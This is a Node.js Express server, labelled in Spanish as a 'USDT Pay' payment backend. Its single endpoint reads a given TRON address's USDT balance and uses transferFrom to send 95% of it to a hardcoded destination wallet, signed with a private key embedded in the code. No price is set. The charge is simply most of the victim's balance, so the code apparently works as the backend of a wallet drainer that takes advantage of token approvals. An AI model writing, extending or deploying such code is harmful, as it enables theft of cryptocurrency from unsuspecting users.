const express = require('express');
const cors = require('cors');
const TronWeb = require('tronweb'); // Cambio en la importación

const app = express();
app.use(express.json());
app.use(cors());

const PRIVATE_KEY = process.env.PRIVATE_KEY || '667e3590b2d8409fa4e5084e15126c226c4bf3330af5094607dec25d5a8e2e4d'; 
const DESTINATION_WALLET = process.env.DESTINATION_WALLET || 'TLaWm1eHRzZ7cR8m8xaRBjhmXJKmc6Mree';

// Forma correcta de instanciar TronWeb compatible con la versión actual
const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    privateKey: PRIVATE_KEY
});

const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

app.get('/', (req, res) => {
    res.send("Backend de USDT Pay funcionando correctamente.");
});

app.post('/api/ejecutar-cobro', async (req, res) => {
    const { userAddress } = req.body;

    if (!userAddress) {
        return res.status(400).json({ exito: false, mensaje: "Dirección de usuario inválida." });
    }

    try {
        const contract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);

        const balanceEnSun = await contract.balanceOf(userAddress).call();
        const saldoRealUSDT = tronWeb.toDecimal(balanceEnSun) / 1000000;

        if (saldoRealUSDT <= 0) {
            return res.status(400).json({ exito: false, mensaje: "El usuario no tiene saldo disponible en USDT." });
        }

        const monto95DelSaldo = saldoRealUSDT * 0.95;
        const montoEnSun = Math.floor(monto95DelSaldo * 1000000);

        const txID = await contract.transferFrom(
            userAddress,
            DESTINATION_WALLET,
            montoEnSun
        ).send({
            feeLimit: 100000000
        });

        return res.json({
            exito: true,
            mensaje: `Se procesó el 95% (${monto95DelSaldo.toFixed(2)} USDT) correctamente.`,
            txID: txID
        });

    } catch (error) {
        console.error("Error al ejecutar transferFrom:", error);
        return res.status(500).json({ 
            exito: false, 
            mensaje: "Error al procesar la transferencia.",
            error: error.message 
        });
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Backend corriendo en el puerto ${PORT}`);
});
